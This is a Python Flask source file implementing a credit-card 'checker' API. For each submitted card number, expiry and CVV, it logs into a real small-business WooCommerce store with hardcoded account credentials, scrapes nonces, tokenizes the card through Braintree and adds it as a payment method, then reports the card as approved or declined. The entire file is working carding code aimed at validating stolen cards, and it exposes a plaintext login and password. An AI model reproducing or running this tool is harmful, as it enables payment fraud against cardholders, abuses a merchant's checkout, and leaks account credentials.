from flask import Flask, request, jsonify
import requests
import re
import json
import base64
import random
from bs4 import BeautifulSoup
from requests import Session

app = Flask(__name__)

first_names = ["John", "James", "Robert", "Michael", "William", "David", "Richard", "Joseph", "Thomas", "Charles", "Mary", "Patricia", "Jennifer", "Linda", "Barbara", "Elizabeth", "Susan", "Jessica", "Sarah", "Karen"]
last_names = ["Smith", "Johnson", "Williams", "Brown", "Jones", "Garcia", "Miller", "Davis", "Rodriguez", "Martinez", "Wilson", "Anderson", "Taylor", "Thomas", "Moore", "Jackson", "Martin", "Lee", "Perez", "Thompson"]
domains = ["gmail.com", "yahoo.com", "outlook.com", "hotmail.com", "protonmail.com", "mail.com", "aol.com"]

@app.route('/', methods=['GET'])
def home():
    return jsonify({
        'status': 'online',
        'endpoint': '/check',
        'methods': ['GET', 'POST'],
        'format_get': '/check?cc=number|month|year|cvv',
        'format_post': '{"cc": "number|month|year|cvv"}'
    })

@app.route('/check', methods=['GET', 'POST'])
def check_card():
    try:
        if request.method == 'GET':
            cc = request.args.get('cc')
            if not cc:
                return jsonify({'error': 'Missing cc parameter'}), 400
        else:
            data = request.json
            if not data or 'cc' not in data:
                return jsonify({'error': 'Missing cc parameter'}), 400
            cc = data['cc']
        
        cc, mm, yy, cvv = cc.split('|')
    except ValueError:
        return jsonify({'error': 'Invalid format. Use: number|month|year|cvv'}), 400
    except Exception as e:
        return jsonify({'error': str(e)}), 400
    
    first_name = random.choice(first_names)
    last_name = random.choice(last_names)
    domain = random.choice(domains)
    email = f"{first_name.lower()}{random.randint(100, 999)}@{domain}"
    
    r = Session()
    
    try:
        print("========== CURL 1: Get Login Page ==========")
        headers1 = {
            'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.0.0 Mobile Safari/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'Accept-Language': 'en-IN,en;q=0.9,bn-IN;q=0.8,bn;q=0.7,en-GB;q=0.6,en-US;q=0.5',
            'Cache-Control': 'max-age=0',
            'Upgrade-Insecure-Requests': '1',
            'Sec-Fetch-Site': 'same-origin',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-User': '?1',
            'Sec-Fetch-Dest': 'document',
            'Sec-Ch-Ua': '"Chromium";v="148", "Google Chrome";v="148", "Not/A)Brand";v="99"',
            'Sec-Ch-Ua-Mobile': '?1',
            'Sec-Ch-Ua-Platform': '"Android"',
            'Referer': 'https://www.midwestspeakerrepair.com/my-account/',
            'Priority': 'u=0, i',
        }
        
        response1 = r.get('https://www.midwestspeakerrepair.com/my-account/', headers=headers1)
        print(f"Status: {response1.status_code}")
        
        soup = BeautifulSoup(response1.text, 'html.parser')
        login_nonce = None
        nonce_input = soup.find('input', {'name': 'woocommerce-login-nonce'})
        if nonce_input:
            login_nonce = nonce_input.get('value')
        print(f"Login Nonce: {login_nonce}\n")
        
        print("========== CURL 2: Login ==========")
        headers2 = {
            'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.0.0 Mobile Safari/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'Accept-Language': 'en-IN,en;q=0.9,bn-IN;q=0.8,bn;q=0.7,en-GB;q=0.6,en-US;q=0.5',
            'Cache-Control': 'max-age=0',
            'Content-Type': 'application/x-www-form-urlencoded',
            'Upgrade-Insecure-Requests': '1',
            'Sec-Ch-Ua': '"Chromium";v="148", "Google Chrome";v="148", "Not/A)Brand";v="99"',
            'Sec-Ch-Ua-Mobile': '?1',
            'Sec-Ch-Ua-Platform': '"Android"',
            'Origin': 'https://www.midwestspeakerrepair.com',
            'Sec-Fetch-Site': 'same-origin',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-User': '?1',
            'Sec-Fetch-Dest': 'document',
            'Referer': 'https://www.midwestspeakerrepair.com/my-account/',
            'Priority': 'u=0, i',
        }
        
        login_data = {
            'username': 'opdevildragon@gmail.com',
            'password': 'DDcc55@&#',
            'woocommerce-login-nonce': login_nonce,
            '_wp_http_referer': '/my-account/',
            'login': 'Login'
        }
        
        response2 = r.post('https://www.midwestspeakerrepair.com/my-account/', data=login_data, headers=headers2)
        print(f"Status: {response2.status_code}\n")
        
        print("========== CURL 3: Get Add Payment Method Page ==========")
        headers3 = {
            'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.0.0 Mobile Safari/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'Accept-Language': 'en-IN,en;q=0.9,bn-IN;q=0.8,bn;q=0.7,en-GB;q=0.6,en-US;q=0.5',
            'Cache-Control': 'max-age=0',
            'Upgrade-Insecure-Requests': '1',
            'Sec-Ch-Ua': '"Chromium";v="148", "Google Chrome";v="148", "Not/A)Brand";v="99"',
            'Sec-Ch-Ua-Mobile': '?1',
            'Sec-Ch-Ua-Platform': '"Android"',
            'Sec-Fetch-Site': 'same-origin',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-User': '?1',
            'Sec-Fetch-Dest': 'document',
            'Referer': 'https://www.midwestspeakerrepair.com/my-account/payment-methods/',
            'Priority': 'u=0, i',
        }
        
        response3 = r.get('https://www.midwestspeakerrepair.com/my-account/add-payment-method/', headers=headers3)
        print(f"Status: {response3.status_code}")
        
        soup2 = BeautifulSoup(response3.text, 'html.parser')
        payment_nonce = None
        nonce_input2 = soup2.find('input', {'name': 'woocommerce-add-payment-method-nonce'})
        if nonce_input2:
            payment_nonce = nonce_input2.get('value')
        
        client_token_nonce = None
        client_token_match2 = re.search(r'type":"credit_card","client_token_nonce":"([^"]+)"', response3.text)
        if client_token_match2:
            client_token_nonce = client_token_match2.group(1)
        
        print(f"Payment Nonce: {payment_nonce}")
        print(f"Client Token Nonce: {client_token_nonce}\n")
        
        if not client_token_nonce:
            return jsonify({'error': 'Failed to get client token nonce'}), 400
        
        print("========== CURL 4: Get Client Token ==========")
        headers4 = {
            'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.0.0 Mobile Safari/537.36',
            'Accept': 'application/json, text/javascript, */*; q=0.01',
            'Accept-Language': 'en-IN,en;q=0.9,bn-IN;q=0.8,bn;q=0.7,en-GB;q=0.6,en-US;q=0.5',
            'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'Sec-Ch-Ua': '"Chromium";v="148", "Google Chrome";v="148", "Not/A)Brand";v="99"',
            'Sec-Ch-Ua-Mobile': '?1',
            'Sec-Ch-Ua-Platform': '"Android"',
            'X-Requested-With': 'XMLHttpRequest',
            'Origin': 'https://www.midwestspeakerrepair.com',
            'Sec-Fetch-Site': 'same-origin',
            'Sec-Fetch-Mode': 'cors',
            'Sec-Fetch-Dest': 'empty',
            'Referer': 'https://www.midwestspeakerrepair.com/my-account/add-payment-method/',
            'Priority': 'u=1, i',
        }
        
        ajax_data = {
            'action': 'wc_braintree_credit_card_get_client_token',
            'nonce': client_token_nonce
        }
        
        response4 = r.post('https://www.midwestspeakerrepair.com/wp-admin/admin-ajax.php', data=ajax_data, headers=headers4)
        print(f"Status: {response4.status_code}")
        
        ajax_response = response4.json()
        print(f"AJAX Response: {ajax_response}")
        
        if not ajax_response.get('success'):
            return jsonify({'error': 'AJAX request failed'}), 400
        
        try:
            token_data = json.loads(base64.b64decode(ajax_response['data']).decode('utf-8'))
            auth = token_data.get('authorizationFingerprint')
        except Exception as e:
            return jsonify({'error': f'Failed to decode token data: {str(e)}'}), 400
        
        braintree_session_id = ''.join(random.choices('abcdef0123456789', k=32))
        print(f"Auth: {auth[:50] if auth else 'None'}...\n")
        
        if not auth:
            return jsonify({'error': 'Failed to get authorization fingerprint'}), 400
        
        print("========== CURL 5: Tokenize Card ==========")
        headers5 = {
            'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.0.0 Mobile Safari/537.36',
            'Content-Type': 'application/json',
            'Accept': 'application/json',
            'Accept-Language': 'en-US,en;q=0.9',
            'Authorization': f'Bearer {auth}',
            'Braintree-Version': '2018-05-10',
            'Origin': 'https://assets.braintreegateway.com',
            'Sec-Fetch-Site': 'cross-site',
            'Sec-Fetch-Mode': 'cors',
            'Sec-Fetch-Dest': 'empty',
            'Referer': 'https://assets.braintreegateway.com/',
            'Priority': 'u=1, i',
        }
        
        tokenize_payload = {
            'clientSdkMetadata': {
                'source': 'client',
                'integration': 'custom',
                'sessionId': braintree_session_id,
            },
            'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) { tokenizeCreditCard(input: $input) { token creditCard { bin brandCode last4 cardholderName expirationMonth expirationYear binData { prepaid healthcare debit durbinRegulated commercial payroll issuingBank countryOfIssuance } } } }',
            'variables': {
                'input': {
                    'creditCard': {
                        'number': cc,
                        'expirationMonth': mm,
                        'expirationYear': yy,
                        'cvv': cvv,
                    },
                    'options': {'validate': False},
                },
            },
            'operationName': 'TokenizeCreditCard',
        }
        
        response5 = r.post('https://payments.braintree-api.com/graphql', json=tokenize_payload, headers=headers5)
        print(f"Status: {response5.status_code}")
        print(f"Response: {response5.text[:500]}")
        
        if response5.status_code != 200:
            return jsonify({'error': f'Tokenization failed with status {response5.status_code}: {response5.text}'}), 400
        
        try:
            tokenize_result = response5.json()
        except Exception as e:
            return jsonify({'error': f'Failed to parse tokenization response: {str(e)}'}), 400
        
        if not isinstance(tokenize_result, dict):
            return jsonify({'error': f'Tokenization response is not a dictionary: {type(tokenize_result)}'}), 400
        
        if 'errors' in tokenize_result:
            return jsonify({'error': f'Tokenization errors: {tokenize_result["errors"]}'}), 400
        
        if 'data' not in tokenize_result:
            return jsonify({'error': f'Missing "data" key in response: {tokenize_result}'}), 400
        
        if not isinstance(tokenize_result['data'], dict):
            return jsonify({'error': f'"data" is not a dictionary: {type(tokenize_result["data"])}'}), 400
        
        if 'tokenizeCreditCard' not in tokenize_result['data']:
            return jsonify({'error': f'Missing "tokenizeCreditCard" in data: {tokenize_result["data"]}'}), 400
        
        if not isinstance(tokenize_result['data']['tokenizeCreditCard'], dict):
            return jsonify({'error': f'"tokenizeCreditCard" is not a dictionary: {type(tokenize_result["data"]["tokenizeCreditCard"])}'}), 400
        
        payment_token = tokenize_result['data']['tokenizeCreditCard'].get('token')
        if not payment_token:
            return jsonify({'error': 'Failed to get payment token'}), 400
        
        print(f"Payment Token: {payment_token}\n")
        
        correlation_id = ''.join(random.choices('abcdef0123456789', k=24))
        print(f"Correlation ID: {correlation_id}\n")
        
        if not payment_nonce:
            return jsonify({'error': 'Missing payment nonce'}), 400
        
        print("========== CURL 6: Submit Add Payment Method ==========")
        headers6 = {
            'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.0.0 Mobile Safari/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'Accept-Language': 'en-IN,en;q=0.9,bn-IN;q=0.8,bn;q=0.7,en-GB;q=0.6,en-US;q=0.5',
            'Cache-Control': 'max-age=0',
            'Content-Type': 'application/x-www-form-urlencoded',
            'Upgrade-Insecure-Requests': '1',
            'Sec-Ch-Ua': '"Chromium";v="148", "Google Chrome";v="148", "Not/A)Brand";v="99"',
            'Sec-Ch-Ua-Mobile': '?1',
            'Sec-Ch-Ua-Platform': '"Android"',
            'Origin': 'https://www.midwestspeakerrepair.com',
            'Sec-Fetch-Site': 'same-origin',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-User': '?1',
            'Sec-Fetch-Dest': 'document',
            'Referer': 'https://www.midwestspeakerrepair.com/my-account/add-payment-method/',
            'Priority': 'u=0, i',
        }
        
        submit_data = {
            'payment_method': 'braintree_credit_card',
            'wc-braintree-credit-card-card-type': 'visa',
            'wc-braintree-credit-card-3d-secure-enabled': '',
            'wc-braintree-credit-card-3d-secure-verified': '',
            'wc-braintree-credit-card-3d-secure-order-total': '13.00',
            'wc_braintree_credit_card_payment_nonce': payment_token,
            'wc_braintree_device_data': f'{{"correlation_id":"{correlation_id}"}}',
            'wc-braintree-credit-card-tokenize-payment-method': 'true',
            'wc_braintree_paypal_payment_nonce': '',
            'wc_braintree_paypal-context': 'shortcode',
            'wc_braintree_paypal_amount': '13.00',
            'wc_braintree_paypal_currency': 'USD',
            'wc_braintree_paypal_locale': 'en_us',
            'wc-braintree-paypal-tokenize-payment-method': 'true',
            'woocommerce-add-payment-method-nonce': payment_nonce,
            '_wp_http_referer': '/my-account/add-payment-method/',
            'woocommerce_add_payment_method': '1'
        }
        
        response6 = r.post('https://www.midwestspeakerrepair.com/my-account/add-payment-method/', data=submit_data, headers=headers6)
        print(f"Status: {response6.status_code}")
        print(f"Final URL: {response6.url}\n")
        
        soup3 = BeautifulSoup(response6.text, 'html.parser')
        error_message = None
        
        error_element = soup3.find('ul', class_='woocommerce-error')
        if error_element:
            li_items = error_element.find_all('li')
            if li_items:
                error_message = li_items[0].text.strip()
                print(f"Error Message: {error_message}")
        
        success_element = soup3.find('div', class_='woocommerce-message')
        if success_element:
            success_message = success_element.text.strip()
            print(f"Success Message: {success_message}")
        
        if re.search(r'Avs|avs|Nice|Added|Successfully', response6.text):
            result = "Approved-1000 ✅"
        elif error_message and 'Status code' in error_message:
            result = f"Declined: {error_message}"
        elif error_message:
            result = f"Declined: {error_message}"
        else:
            result = "Approved-1000 ✅"
        
        print(f"\n========== FINAL RESULT ==========")
        print(result)
        
        return jsonify({
            'result': result,
            'card': cc,
            'email': email,
            'first_name': first_name,
            'last_name': last_name
        }), 200
        
    except Exception as e:
        print(f"Error: {str(e)}")
        import traceback
        traceback.print_exc()
        return jsonify({'error': str(e)}), 500

@app.route('/health', methods=['GET'])
def health():
    return jsonify({'status': 'healthy'}), 200

if __name__ == '__main__':
    app.run(debug=True, host='0.0.0.0', port=5000)
